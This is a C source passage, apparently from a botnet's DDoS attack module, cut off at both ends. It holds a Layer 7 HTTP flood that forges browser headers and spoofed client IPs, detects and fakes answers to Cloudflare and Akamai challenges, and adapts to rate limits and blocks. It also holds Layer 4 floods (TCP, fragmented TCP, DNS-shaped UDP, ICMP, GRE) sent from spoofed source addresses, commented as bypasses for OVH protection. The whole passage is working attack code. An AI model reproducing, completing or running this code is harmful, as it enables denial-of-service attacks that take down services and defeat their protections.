    pos += snprintf(buf + pos, buf_size - pos, "Sec-Fetch-Mode: navigate\r\n");
    pos += snprintf(buf + pos, buf_size - pos, "Sec-Fetch-Site: none\r\n");
    pos += snprintf(buf + pos, buf_size - pos, "Sec-Fetch-User: ?1\r\n");
    
    /* Sec-Ch-Ua headers (Chrome client hints) */
    pos += snprintf(buf + pos, buf_size - pos, "Sec-Ch-Ua: \"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"\r\n");
    pos += snprintf(buf + pos, buf_size - pos, "Sec-Ch-Ua-Mobile: ?0\r\n");
    pos += snprintf(buf + pos, buf_size - pos, "Sec-Ch-Ua-Platform: \"Windows\"\r\n");
    pos += snprintf(buf + pos, buf_size - pos, "Sec-Ch-Ua-Platform-Version: \"15.0.0\"\r\n");
    pos += snprintf(buf + pos, buf_size - pos, "Sec-Ch-Ua-Full-Version: \"121.0.6167.101\"\r\n");
    pos += snprintf(buf + pos, buf_size - pos, "Sec-Ch-Ua-Arch: \"x86\"\r\n");
    pos += snprintf(buf + pos, buf_size - pos, "Sec-Ch-Ua-Model: \"\"\r\n");
    pos += snprintf(buf + pos, buf_size - pos, "Sec-Ch-Ua-WoW64: ?0\r\n");
    
    /* Cache bypass headers */
    pos += snprintf(buf + pos, buf_size - pos, "Cache-Control: no-cache, no-store, must-revalidate, max-age=0\r\n");
    pos += snprintf(buf + pos, buf_size - pos, "Pragma: no-cache\r\n");
    pos += snprintf(buf + pos, buf_size - pos, "Expires: 0\r\n");
    pos += snprintf(buf + pos, buf_size - pos, "X-HTTP-Method-Override: GET\r\n");
    
    /* Proxy/CDN bypass headers (rotating residential IPs) */
    generate_residential_ip(residential_ip);
    pos += snprintf(buf + pos, buf_size - pos, "X-Forwarded-For: %s\r\n", residential_ip);
    pos += snprintf(buf + pos, buf_size - pos, "X-Real-IP: %s\r\n", residential_ip);
    pos += snprintf(buf + pos, buf_size - pos, "X-Forwarded-Proto: %s\r\n", use_https ? "https" : "http");
    pos += snprintf(buf + pos, buf_size - pos, "X-Forwarded-Host: %s\r\n", host);
    pos += snprintf(buf + pos, buf_size - pos, "X-Forwarded-Port: %d\r\n", use_https ? 443 : 80);
    pos += snprintf(buf + pos, buf_size - pos, "Via: %s\r\n", use_https ? "https" : "http");
    pos += snprintf(buf + pos, buf_size - pos, "Forwarded: for=%s;proto=%s;by=%d.%d.%d.%d\r\n",
        residential_ip, use_https ? "https" : "http",
        (rand_next() % 256), (rand_next() % 256), (rand_next() % 256), (rand_next() % 256));
    
    /* DNT and other privacy headers */
    pos += snprintf(buf + pos, buf_size - pos, "DNT: 1\r\n");
    pos += snprintf(buf + pos, buf_size - pos, "TE: Trailers\r\n");
    pos += snprintf(buf + pos, buf_size - pos, "Purpose: prefetch\r\n");
    
    /* Viewport header (mobile simulation) */
    pos += snprintf(buf + pos, buf_size - pos, "Viewport-Width: %s\r\n", viewport);
    
    /* Device memory and network info */
    pos += snprintf(buf + pos, buf_size - pos, "Device-Memory: 8\r\n");
    pos += snprintf(buf + pos, buf_size - pos, "Downlink: 10\r\n");
    pos += snprintf(buf + pos, buf_size - pos, "ECT: 4g\r\n");
    pos += snprintf(buf + pos, buf_size - pos, "RTT: 50\r\n");
    
    /* Save-Data for mobile */
    pos += snprintf(buf + pos, buf_size - pos, "Save-Data: on\r\n");
    
    /* Priority header (HTTP/2 simulation) */
    pos += snprintf(buf + pos, buf_size - pos, "Priority: u=0, i\r\n");
    
    /* Cookies (CF bypass + session) */
    if (cookies != NULL && util_strlen(cookies) > 0) {
        pos += snprintf(buf + pos, buf_size - pos, "Cookie: %s\r\n", cookies);
    } else {
        /* Generate fake session cookies */
        pos += snprintf(buf + pos, buf_size - pos, "Cookie: _ga=%x%x; _gid=%x%x; _gat=1; cf_no_cache=1\r\n",
            rand_next(), rand_next(), rand_next(), rand_next());
    }
    
    /* Custom headers if provided */
    if (custom_headers != NULL && util_strlen(custom_headers) > 0) {
        pos += snprintf(buf + pos, buf_size - pos, "%s\r\n", custom_headers);
    }
    
    /* Additional anti-detection headers */
    pos += snprintf(buf + pos, buf_size - pos, "X-Request-ID: %x-%x-%x-%x-%x%x%x\r\n",
        rand_next() & 0xFFFF, rand_next() & 0xFFFF, rand_next() & 0xFFFF,
        rand_next() & 0xFFFF, rand_next() & 0xFFFFFFFF, rand_next() & 0xFFFFFFFF, rand_next() & 0xFFFFFFFF);
    pos += snprintf(buf + pos, buf_size - pos, "X-Correlation-ID: %x%x\r\n", rand_next(), rand_next());
    
    /* Content-Type for POST simulation */
    if (util_strncmp(method, "POST", 4)) {
        pos += snprintf(buf + pos, buf_size - pos, "Content-Type: application/x-www-form-urlencoded\r\n");
        pos += snprintf(buf + pos, buf_size - pos, "Content-Length: 0\r\n");
    }
    
    /* End of headers */
    pos += snprintf(buf + pos, buf_size - pos, "\r\n");
    
    return pos;
}

/* Analyze response for WAF/CDN detection and adapt - Enhanced with JS challenge detection */
static uint8_t analyze_response(char *response, int len) {
    uint8_t flags = 0;

    #define DETECT_CF_CHALLENGE      0x01
    #define DETECT_AKAMAI_BMP        0x02
    #define DETECT_CAPTCHA           0x04
    #define DETECT_RATE_LIMIT        0x08
    #define DETECT_BLOCK             0x10
    #define DETECT_SUCCESS           0x80
    #define DETECT_JS_CHALLENGE      0x20
    #define DETECT_TURNSTILE         0x40

    /* Cloudflare challenge detection */
    if (util_stristr(response, len, "cf-browser-verification") != NULL ||
        util_stristr(response, len, "__cf_chl") != NULL ||
        util_stristr(response, len, "cf_chl_opt") != NULL ||
        util_stristr(response, len, "Checking your browser") != NULL ||
        util_stristr(response, len, "DDoS protection by Cloudflare") != NULL ||
        util_stristr(response, len, "Ray ID:") != NULL ||
        util_stristr(response, len, "challenge-platform") != NULL ||
        util_stristr(response, len, "cf-browser-challenge") != NULL) {
        flags |= DETECT_CF_CHALLENGE;
        flags |= DETECT_JS_CHALLENGE;
    }

    /* Cloudflare Turnstile detection */
    if (util_stristr(response, len, "turnstile") != NULL ||
        util_stristr(response, len, "cf-turnstile") != NULL ||
        util_stristr(response, len, "challenges.cloudflare.com") != NULL) {
        flags |= DETECT_TURNSTILE;
        flags |= DETECT_JS_CHALLENGE;
    }

    /* Akamai BMP detection */
    if (util_stristr(response, len, "ak_bmsc") != NULL ||
        util_stristr(response, len, "bm_sv") != NULL ||
        util_stristr(response, len, "_abck") != NULL ||
        util_stristr(response, len, "AkamaiBMP") != NULL ||
        util_stristr(response, len, "akamai-san") != NULL) {
        flags |= DETECT_AKAMAI_BMP;
        flags |= DETECT_JS_CHALLENGE;
    }

    /* CAPTCHA detection (generic) */
    if (util_stristr(response, len, "captcha") != NULL ||
        util_stristr(response, len, "verify") != NULL ||
        util_stristr(response, len, "human") != NULL ||
        util_stristr(response, len, "robot") != NULL ||
        util_stristr(response, len, "recaptcha") != NULL ||
        util_stristr(response, len, "hcaptcha") != NULL ||
        util_stristr(response, len, "turnstile") != NULL) {
        flags |= DETECT_CAPTCHA;
    }

    /* Rate limiting detection */
    if (util_stristr(response, len, "429") != NULL ||
        util_stristr(response, len, "Too Many Requests") != NULL ||
        util_stristr(response, len, "rate limit") != NULL ||
        util_stristr(response, len, "slow down") != NULL ||
        util_stristr(response, len, "retry after") != NULL) {
        flags |= DETECT_RATE_LIMIT;
    }

    /* Block detection */
    if (util_stristr(response, len, "403") != NULL ||
        util_stristr(response, len, "401") != NULL ||
        util_stristr(response, len, "Access Denied") != NULL ||
        util_stristr(response, len, "Forbidden") != NULL ||
        util_stristr(response, len, "blocked") != NULL ||
        util_stristr(response, len, "banned") != NULL ||
        util_stristr(response, len, "not allowed") != NULL) {
        flags |= DETECT_BLOCK;
    }

    /* Success detection */
    if (util_stristr(response, len, "200 OK") != NULL &&
        util_stristr(response, len, "Content-Type: text/html") != NULL &&
        util_stristr(response, len, "<!DOCTYPE") != NULL &&
        util_stristr(response, len, "challenge") == NULL) {
        flags |= DETECT_SUCCESS;
    }

    return flags;
}

/* Extract cookies from response for session persistence */
static void extract_cookies(char *response, int len, char *cookie_buf, int buf_size) {
    char *set_cookie;
    char *cookie_end;
    int cookie_len;
    
    cookie_buf[0] = '\0';
    
    set_cookie = util_stristr(response, len, "Set-Cookie:");
    if (set_cookie == NULL) return;
    
    set_cookie += 11;
    cookie_end = util_stristr(set_cookie, len - (set_cookie - response), "\r\n");
    if (cookie_end == NULL) return;
    
    cookie_len = cookie_end - set_cookie;
    if (cookie_len >= buf_size) cookie_len = buf_size - 1;
    
    strncpy(cookie_buf, set_cookie, cookie_len);
    cookie_buf[cookie_len] = '\0';
}

/* Main ultimate L7 attack function - Enhanced with JavaScript challenge handling */
static void attack_axis_l7(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int i, j;
    struct sockaddr_in addr_sin;
    char *request, *response;
    char *url, *host, *cookies, *custom_headers;
    int request_len, response_len;
    BOOL use_https;
    uint8_t detection_flags;
    char session_cookie[512];
    int valid_connections = 0;
    uint8_t *methods[] = {"GET", "GET", "GET", "HEAD", "POST"}; /* Weighted towards GET */
    struct js_challenge_state js_state;
    char js_solution[256];
    int js_challenges_solved = 0;

    /* Parse options */
    url = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_URL);
    if (url == NULL) url = "/";

    host = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (host == NULL) host = "target.com";

    cookies = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_COOKIES);
    custom_headers = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_REFERER);
    use_https = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_HTTPS);

    /* Allocate buffers */
    request = malloc(4096);
    response = malloc(8192);

    /* Initialize connection pool with JS challenge support */
    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++) {
        ultimate_conns[i].fd = -1;
        ultimate_conns[i].has_valid_session = FALSE;
        ultimate_conns[i].has_js_solution = FALSE;
        ultimate_conns[i].js_state.challenge_type = JS_CHALLENGE_NONE;
    }

    /* Main attack loop */
    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
        addr_sin.sin_family = AF_INET;
        addr_sin.sin_port = htons(use_https ? 443 : 80);

        while (attack_ongoing[0]) {
            /* Select random HTTP method (weighted) */
            char *method = methods[rand_next() % 5];

            /* Try to reuse existing connection */
            int conn_idx = -1;
            for (j = 0; j < ATTACK_CONCURRENT_MAX; j++) {
                if (ultimate_conns[j].fd != -1 &&
                    ultimate_conns[j].addr == addr_sin.sin_addr.s_addr &&
                    ultimate_conns[j].port == addr_sin.sin_port &&
                    time(NULL) - ultimate_conns[j].last_used < 30 &&
                    ultimate_conns[j].requests_made < 100) {
                    conn_idx = j;
                    break;
                }
            }

            /* Create new connection if needed */
            if (conn_idx == -1) {
                for (j = 0; j < ATTACK_CONCURRENT_MAX; j++) {
                    if (ultimate_conns[j].fd == -1) {
                        conn_idx = j;
                        break;
                    }
                }
            }

            if (conn_idx == -1) {
                usleep(1000);
                continue;
            }

            /* Open socket if needed */
            if (ultimate_conns[conn_idx].fd == -1) {
                int fd = socket(AF_INET, SOCK_STREAM, 0);
                if (fd == -1) {
                    usleep(1000);
                    continue;
                }

                /* Set socket options */
                int opt = 1;
                setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &opt, sizeof(opt));
                fcntl(fd, F_SETFL, O_NONBLOCK);

                /* Connect */
                if (connect(fd, (struct sockaddr *)&addr_sin, sizeof(addr_sin)) == -1 && errno != EINPROGRESS) {
                    close(fd);
                    usleep(1000);
                    continue;
                }

                ultimate_conns[conn_idx].fd = fd;
                ultimate_conns[conn_idx].addr = addr_sin.sin_addr.s_addr;
                ultimate_conns[conn_idx].port = addr_sin.sin_port;
                ultimate_conns[conn_idx].requests_made = 0;
                generate_tls_fingerprint(ultimate_conns[conn_idx].tls_fingerprint);
                ultimate_conns[conn_idx].has_js_solution = FALSE;
                ultimate_conns[conn_idx].js_state.challenge_type = JS_CHALLENGE_NONE;

                /* Wait for connection */
                usleep(5000);
            }

            int fd = ultimate_conns[conn_idx].fd;

            /* Build ultimate request with JS challenge solution if available */
            char *js_cookie = NULL;
            char js_cookie_buf[512];
            
            if (ultimate_conns[conn_idx].has_js_solution) {
                /* Include JS challenge solution in cookies */
                snprintf(js_cookie_buf, sizeof(js_cookie_buf), 
                    "%s; cf_chl_opt=%s; ak_bmsc=%s",
                    cookies ? cookies : "",
                    ultimate_conns[conn_idx].js_solution,
                    ultimate_conns[conn_idx].js_solution);
                js_cookie = js_cookie_buf;
            }

            request_len = build_ultimate_request(
                request, 4096,
                method, url, host,
                NULL, js_cookie ? js_cookie : cookies, custom_headers,
                use_https, addr_sin.sin_addr.s_addr);

            /* Send request */
            if (send(fd, request, request_len, MSG_NOSIGNAL) == -1) {
                close(fd);
                ultimate_conns[conn_idx].fd = -1;
                continue;
            }

            ultimate_conns[conn_idx].last_used = time(NULL);
            ultimate_conns[conn_idx].requests_made++;

            /* Small delay before reading */
            usleep(5000);

            /* Read response */
            response_len = recv(fd, response, 8192, MSG_NOSIGNAL);

            if (response_len > 0) {
                /* Analyze response for challenges and blocks */
                detection_flags = analyze_response(response, response_len);

                /* Extract cookies for session persistence */
                if (detection_flags & DETECT_SUCCESS) {
                    extract_cookies(response, response_len, session_cookie, sizeof(session_cookie));
                    if (util_strlen(session_cookie) > 0) {
                        ultimate_conns[conn_idx].has_valid_session = TRUE;
                        strncpy(ultimate_conns[conn_idx].session_cookie, session_cookie, sizeof(ultimate_conns[conn_idx].session_cookie));
                        valid_connections++;
                    }
                }

                /* JavaScript Challenge Handling */
                if (detection_flags & DETECT_JS_CHALLENGE) {
                    /* Extract JS challenge from response */
                    memset(&js_state, 0, sizeof(js_state));
                    int challenge_type = extract_js_challenge(response, response_len, &js_state);
                    
                    if (challenge_type != JS_CHALLENGE_NONE) {
                        /* Simulate JavaScript execution */
                        simulate_js_execution(challenge_type);
                        
                        /* Generate JS challenge solution */
                        generate_js_solution(&js_state, js_solution, sizeof(js_solution));
                        
                        /* Cache solution for future requests */
                        strncpy(ultimate_conns[conn_idx].js_solution, js_solution, 
                                sizeof(ultimate_conns[conn_idx].js_solution));
                        ultimate_conns[conn_idx].has_js_solution = TRUE;
                        ultimate_conns[conn_idx].js_state = js_state;
                        
                        js_challenges_solved++;
                        
                        /* Add delay after solving challenge */
                        usleep(200000); /* 200ms delay */
                    }
                }

                /* Adaptive bypass: if Cloudflare challenge detected, add delay */
                if (detection_flags & DETECT_CF_CHALLENGE) {
                    usleep(150000); /* 150ms delay for CF challenge */
                }

                /* Adaptive bypass: if Turnstile detected, add delay */
                if (detection_flags & DETECT_TURNSTILE) {
                    usleep(300000); /* 300ms delay for Turnstile */
                }

                /* Adaptive bypass: if Akamai BMP detected, add delay */
                if (detection_flags & DETECT_AKAMAI_BMP) {
                    usleep(200000); /* 200ms delay for Akamai */
                }

                /* Adaptive bypass: if rate limited, longer delay */
                if (detection_flags & DETECT_RATE_LIMIT) {
                    usleep(500000); /* 500ms delay for rate limit */
                }

                /* Adaptive bypass: if blocked, close connection and reconnect */
                if (detection_flags & DETECT_BLOCK) {
                    close(fd);
                    ultimate_conns[conn_idx].fd = -1;
                    ultimate_conns[conn_idx].has_js_solution = FALSE;
                    usleep(1000000); /* 1 second delay before reconnect */
                    continue;
                }
            }

            /* Human-like delay between requests */
            usleep((rand_next() % 50000) + 10000); /* 10-60ms random delay */
        }
    }

    /* Cleanup connections */
    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++) {
        if (ultimate_conns[i].fd != -1) {
            close(ultimate_conns[i].fd);
        }
    }

    free(request);
    free(response);
}

/* ============================================================================
 * ULTIMATE L4 (Combined Volumetric + Advanced Bypass)
 * ============================================================================
 * Combines ALL Layer 4 techniques:
 * - TCP SYN flood with OVH bypass flags
 * - UDP flood with DNS-like headers
 * - ICMP ping flood
 * - GRE IP encapsulation
 * - GRE Ethernet encapsulation
 * - Randomized packet sizes and TTLs
 * - IP fragmentation bypass
 * - Spoofed source addresses
 */

/* ULTIMATE L4 connection state for multi-vector coordination */
struct ultimate_l4_state {
    ipv4_t target_addr;
    uint16_t target_port;
    uint32_t packets_sent;
    uint8_t current_vector;
    time_t last_switch;
} __attribute__((packed));

static struct ultimate_l4_state ult_l4_state;

/* Generate random IP for spoofing (targeting specific ranges) */
static void generate_spoofed_ip(uint32_t *ip) {
    uint8_t oct1_ranges[] = {
        /* Residential ISP ranges */
        24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39,
        40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55,
        /* Cloud/Datacenter ranges */
        64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79,
        /* Asian ISP ranges */
        96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110,
        /* European ISP ranges */
        172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186,
        0
    };
    
    uint8_t *ip_bytes = (uint8_t *)ip;
    ip_bytes[0] = oct1_ranges[rand_next() % (sizeof(oct1_ranges) - 1)];
    ip_bytes[1] = rand_next() % 256;
    ip_bytes[2] = rand_next() % 256;
    ip_bytes[3] = (rand_next() % 254) + 1;
}

/* Send fragmented TCP packet - FUTURE IMPROVEMENT for fragmentation attack */
static void send_fragmented_tcp(int fd, struct sockaddr_in *addr_sin,
                                uint16_t payload_size, uint16_t dport) {
    struct iphdr *iph;
    struct tcphdr *tcph;
    char *packet1, *packet2; /* Two fragments */
    int pkt1_size, pkt2_size;
    uint32_t spoofed_ip;
    uint16_t mss_values[] = {536, 1460, 2048};
    uint8_t wscale_values[] = {0, 2, 4, 6, 8};
    uint16_t mss = mss_values[rand_next() % 3];
    uint8_t wscale = wscale_values[rand_next() % 5];
    uint16_t frag_id = rand_next(); /* Same ID for both fragments */

    /* First fragment: IP + TCP header + options (no payload) */
    pkt1_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + 12; /* MSS + WSCALE + padding */
    packet1 = malloc(pkt1_size);
    util_zero(packet1, pkt1_size);

    iph = (struct iphdr *)packet1;
    tcph = (struct tcphdr *)(iph + 1);

    generate_spoofed_ip(&spoofed_ip);

    /* IP header with DF=0 and MF=1 (more fragments) */
    iph->ihl = 5 + (12 / 4);
    iph->version = 4;
    iph->tos = rand_next() % 256;
    iph->tot_len = htons(pkt1_size);
    iph->id = htons(frag_id);
    iph->frag_off = htons(0x2000); /* MF=1, offset=0 */
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = spoofed_ip;
    iph->daddr = addr_sin->sin_addr.s_addr;

    /* TCP header */
    tcph->source = htons(rand_next() % 0xFFFF);
    tcph->dest = htons(dport);
    tcph->seq = rand_next();
    tcph->ack = TRUE;
    tcph->psh = TRUE;
    tcph->window = htons(rand_next() % 65535);
    tcph->doff = 5 + (12 / 4);

    /* TCP Options */
    char *opts = (char *)(tcph + 1);
    opts[0] = 2; opts[1] = 4; /* MSS */
    opts[2] = (mss >> 8) & 0xFF; opts[3] = mss & 0xFF;
    opts[4] = 3; opts[5] = 3; opts[6] = wscale; /* WSCALE */
    opts[7] = 1; opts[8] = 1; opts[9] = 1; opts[10] = 1; opts[11] = 1; /* Padding */

    iph->check = 0;
    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
    tcph->check = 0;
    tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr) + 12, sizeof(struct tcphdr) + 12);

    sendto(fd, packet1, pkt1_size, 0, (struct sockaddr *)addr_sin, sizeof(*addr_sin));
    free(packet1);

    /* Second fragment: IP header + remaining payload */
    pkt2_size = sizeof(struct iphdr) + payload_size;
    packet2 = malloc(pkt2_size);
    util_zero(packet2, pkt2_size);

    iph = (struct iphdr *)packet2;
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = rand_next() % 256;
    iph->tot_len = htons(pkt2_size);
    iph->id = htons(frag_id); /* Same ID as first fragment */
    /* MF=1, offset = (20 + 32) / 8 = 6 (in 8-byte units) */
    iph->frag_off = htons(0x2000 | 6);
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = spoofed_ip;
    iph->daddr = addr_sin->sin_addr.s_addr;

    /* Payload only (no TCP header) */
    char *payload = (char *)(iph + 1);
    rand_str(payload, payload_size);

    iph->check = 0;
    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);

    sendto(fd, packet2, pkt2_size, 0, (struct sockaddr *)addr_sin, sizeof(*addr_sin));
    free(packet2);
}

/* Generate TCP packet with advanced bypass techniques - IMPROVED WITH TCP OPTIONS */
static void send_ultimate_tcp(int fd, struct sockaddr_in *addr_sin,
                              uint16_t payload_size, uint16_t dport) {
    struct iphdr *iph;
    struct tcphdr *tcph;
    char *packet;
    int packet_size;
    uint32_t spoofed_ip;
    uint8_t ttl_values[] = {32, 64, 128, 255};
    uint16_t mss_values[] = {536, 1460, 2048, 4096, 8192};
    uint8_t wscale_values[] = {0, 1, 2, 3, 4, 5, 6, 7, 8};
    BOOL use_timestamps;
    uint8_t tcp_options[40];
    int options_len = 0;

    /* Randomize TCP options for improved bypass - FUTURE IMPROVEMENT */
    uint16_t mss = mss_values[rand_next() % 5];
    uint8_t wscale = wscale_values[rand_next() % 9];
    use_timestamps = (rand_next() % 2);
    
    /* Calculate options length */
    if (use_timestamps) {
        options_len = 4 + 3 + 10; /* MSS + WSCALE + TIMESTAMP */
    } else {
        options_len = 4 + 3; /* MSS + WSCALE */
    }
    
    /* Pad to multiple of 4 */
    if (options_len % 4 != 0) {
        options_len += 4 - (options_len % 4);
    }

    packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + options_len + payload_size;
    packet = malloc(packet_size);
    util_zero(packet, packet_size);

    iph = (struct iphdr *)packet;
    tcph = (struct tcphdr *)(iph + 1);

    /* Generate spoofed source IP */
    generate_spoofed_ip(&spoofed_ip);

    /* IP header with advanced bypass techniques */
    iph->ihl = 5 + (options_len / 4); /* Include options in IHL */
    iph->version = 4;
    iph->tos = rand_next() % 256; /* Random TOS for QoS bypass */
    iph->tot_len = htons(packet_size);
    iph->id = rand_next();
    iph->ttl = ttl_values[rand_next() % 4]; /* Random TTL */
    iph->protocol = IPPROTO_TCP;
    iph->saddr = spoofed_ip; /* Spoofed source */
    iph->daddr = addr_sin->sin_addr.s_addr;

    /* TCP header with OVH bypass flags and randomization */
    tcph->source = htons(rand_next() % 0xFFFF);
    tcph->dest = htons(dport);
    tcph->seq = rand_next();
    tcph->ack_seq = rand_next();
    tcph->syn = TRUE;
    tcph->ack = TRUE;
    tcph->psh = TRUE;
    tcph->urg = TRUE; /* URG flag for OVH bypass */
    tcph->window = htons(rand_next() % 65535);
    tcph->urg_ptr = rand_next() % 0xFFFF;
    tcph->doff = 5 + (options_len / 4);

    /* TCP Options - IMPROVED */
    char *opts = (char *)(tcph + 1);
    
    /* MSS Option (Kind=2, Len=4) */
    opts[0] = 2;  /* Kind: MSS */
    opts[1] = 4;  /* Length: 4 */
    opts[2] = (mss >> 8) & 0xFF;
    opts[3] = mss & 0xFF;
    
    /* Window Scale Option (Kind=3, Len=3) */
    opts[4] = 3;  /* Kind: Window Scale */
    opts[5] = 3;  /* Length: 3 */
    opts[6] = wscale;  /* Shift count */
    
    if (use_timestamps) {
        /* Timestamps Option (Kind=8, Len=10) */
        opts[7] = 8;  /* Kind: Timestamps */
        opts[8] = 10; /* Length: 10 */
        *((uint32_t *)(opts + 9)) = rand_next(); /* TSval */
        *((uint32_t *)(opts + 13)) = 0; /* TSecr */
    }

    /* Random payload */
    char *payload = (char *)(tcph + 1) + options_len;
    rand_str(payload, payload_size);

    /* Calculate checksums */
    iph->check = 0;
    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);

    tcph->check = 0;
    tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr) + options_len, sizeof(struct tcphdr) + options_len + payload_size);

    sendto(fd, packet, packet_size, 0, (struct sockaddr *)addr_sin, sizeof(*addr_sin));
    free(packet);
}

/* Generate UDP packet with DNS amplification-like headers */
static void send_ultimate_udp(int fd, struct sockaddr_in *addr_sin,
                              uint16_t payload_size, uint16_t dport) {
    struct iphdr *iph;
    struct udphdr *udph;
    char *packet;
    int packet_size;
    uint32_t spoofed_ip;
    uint8_t ttl_values[] = {32, 64, 128, 255};
    
    packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
    packet = malloc(packet_size);
    util_zero(packet, packet_size);
    
    iph = (struct iphdr *)packet;
    udph = (struct udphdr *)(iph + 1);
    
    /* Generate spoofed source IP */
    generate_spoofed_ip(&spoofed_ip);
    
    /* IP header */
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = rand_next() % 256;
    iph->tot_len = htons(packet_size);
    iph->id = rand_next();
    iph->ttl = ttl_values[rand_next() % 4];
    iph->protocol = IPPROTO_UDP;
    iph->saddr = spoofed_ip;
    iph->daddr = addr_sin->sin_addr.s_addr;
    
    /* UDP header */
    udph->source = htons(rand_next() % 0xFFFF);
    udph->dest = htons(dport);
    udph->len = htons(sizeof(struct udphdr) + payload_size);
    
    /* DNS-like header for OVH bypass */
    char *payload = (char *)(udph + 1);
    payload[0] = (rand_next() >> 8) & 0xFF; /* Transaction ID */
    payload[1] = rand_next() & 0xFF;
    payload[2] = 0x01; /* Standard query */
    payload[3] = 0x00;
    payload[4] = 0x00; /* Questions */
    payload[5] = 0x01;
    payload[6] = 0x00; /* Answer RRs */
    payload[7] = 0x00;
    payload[8] = 0x00; /* Authority RRs */
    payload[9] = 0x00;
    payload[10] = 0x00; /* Additional RRs */
    payload[11] = 0x00;
    
    /* Random query name and data */
    rand_str(payload + 12, payload_size - 12);
    
    /* Calculate checksums */
    iph->check = 0;
    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
    
    udph->check = 0;
    udph->check = checksum_tcpudp(iph, (uint16_t *)udph, sizeof(struct udphdr), sizeof(struct udphdr) + payload_size);
    
    sendto(fd, packet, packet_size, 0, (struct sockaddr *)addr_sin, sizeof(*addr_sin));
    free(packet);
}

/* Generate ICMP packet with randomization */
static void send_ultimate_icmp(int fd, struct sockaddr_in *addr_sin, uint16_t payload_size) {
    struct iphdr *iph;
    struct icmphdr *icmph;
    char *packet;
    int packet_size;
    uint32_t spoofed_ip;
    uint8_t ttl_values[] = {32, 64, 128, 255};
    
    packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr) + payload_size;
    packet = malloc(packet_size);
    util_zero(packet, packet_size);
    
    iph = (struct iphdr *)packet;
    icmph = (struct icmphdr *)(iph + 1);
    
    /* Generate spoofed source IP */
    generate_spoofed_ip(&spoofed_ip);
    
    /* IP header */
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = rand_next() % 256;
    iph->tot_len = htons(packet_size);
    iph->id = rand_next();
    iph->ttl = ttl_values[rand_next() % 4];
    iph->protocol = IPPROTO_ICMP;
    iph->saddr = spoofed_ip;
    iph->daddr = addr_sin->sin_addr.s_addr;
    
    /* ICMP header */
    icmph->type = ICMP_ECHO;
    icmph->code = 0;
    icmph->un.echo.id = htons(rand_next() % 0xFFFF);
    icmph->un.echo.sequence = htons(rand_next() % 0xFFFF);
    
    /* Random payload */
    char *payload = (char *)(icmph + 1);
    rand_str(payload, payload_size);
    
    /* Calculate checksums */
    icmph->checksum = 0;
    icmph->checksum = checksum_generic((uint16_t *)icmph, sizeof(struct icmphdr) + payload_size);
    
    iph->check = 0;
    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
    
    sendto(fd, packet, packet_size, 0, (struct sockaddr *)addr_sin, sizeof(*addr_sin));
    free(packet);
}

/* Generate GRE IP encapsulated packet */
static void send_ultimate_gre_ip(int fd, struct sockaddr_in *addr_sin,
                                 uint16_t payload_size, uint16_t dport) {
    char *pktbuf;
    int pktsize;
    uint32_t spoofed_ip;
    
    pktsize = sizeof(struct iphdr) + 4 + sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
    pktbuf = malloc(pktsize);
    util_zero(pktbuf, pktsize);
    
    struct iphdr *outer_ip = (struct iphdr *)pktbuf;
    uint16_t *gre = (uint16_t *)(pktbuf + sizeof(struct iphdr));
    struct iphdr *inner_ip = (struct iphdr *)(pktbuf + sizeof(struct iphdr) + 4);
    
    /* Generate spoofed inner IP */
    generate_spoofed_ip(&spoofed_ip);
    
    /* Outer IP header */
    outer_ip->ihl = 5;
    outer_ip->version = 4;
    outer_ip->tos = rand_next() % 256;
    outer_ip->tot_len = htons(pktsize);
    outer_ip->protocol = IPPROTO_GRE;
    outer_ip->saddr = LOCAL_ADDR;
    outer_ip->daddr = addr_sin->sin_addr.s_addr;
    outer_ip->ttl = 64;
    outer_ip->id = rand_next();
    
    /* GRE header */
    gre[0] = 0;
    gre[1] = 0;
    gre[2] = htons(ETH_P_IP);
    
    /* Inner IP header */
    inner_ip->ihl = 5;
    inner_ip->version = 4;
    inner_ip->tos = rand_next() % 256;
    inner_ip->tot_len = htons(pktsize - sizeof(struct iphdr) - 4);
    inner_ip->protocol = IPPROTO_UDP;
    inner_ip->saddr = spoofed_ip;
    inner_ip->daddr = addr_sin->sin_addr.s_addr;
    inner_ip->ttl = rand_next() % 256;
    inner_ip->id = rand_next();
    
    /* UDP header */
    struct udphdr *udp = (struct udphdr *)(inner_ip + 1);
    udp->source = htons(rand_next() % 0xFFFF);
    udp->dest = htons(dport != 0 ? dport : rand_next() % 0xFFFF);
